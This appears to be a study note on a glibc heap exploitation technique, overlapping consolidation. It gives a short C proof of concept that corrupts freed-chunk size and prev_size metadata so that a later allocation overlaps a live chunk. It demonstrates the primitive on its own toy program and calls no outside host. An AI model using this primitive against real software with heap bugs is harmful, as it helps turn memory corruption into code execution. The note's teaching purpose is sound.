## overlapping consolidation

**Purpose:** We can have two separate chunks allocated to the same space, no need heap leak (no need to create fake main_arena)

**Require:** Have an ability to change the metadata of the allocated chunks

## POC

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define CHUNK_SIZE 0x420

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    long *chunk0, *chunk1, *chunk2, *chunk3, *first_consolidated_chunk, *overlapping_chunk;

    chunk0 = malloc(CHUNK_SIZE);
    chunk1 = malloc(CHUNK_SIZE);
    chunk2 = malloc(CHUNK_SIZE);
    chunk3 = malloc(0x10); // Prevent top chunk consolidation

    free(chunk0); // Put chunk0 into the unsorted bin

    /* VULN HERE */
    chunk0[-1] = 0x860; // Extend the size of chunk0 to overlap with chunk1
    chunk2[-1] = 0x430; // Remove the prev_inuse bit of chunk2
    /* VULN HERE */

    chunk2[-2] = 0x860; // Fake prev_size of chunk2
    free(chunk2); // Consolidate chunk0 and chunk2 into a big free chunk

    first_consolidated_chunk = malloc(CHUNK_SIZE); // Padding this depend on purpose
    overlapping_chunk = malloc(CHUNK_SIZE); // Should overlap with chunk1

    assert(overlapping_chunk == chunk1); // Check if we successfully overlapped chunk1

    return 0;
}
```
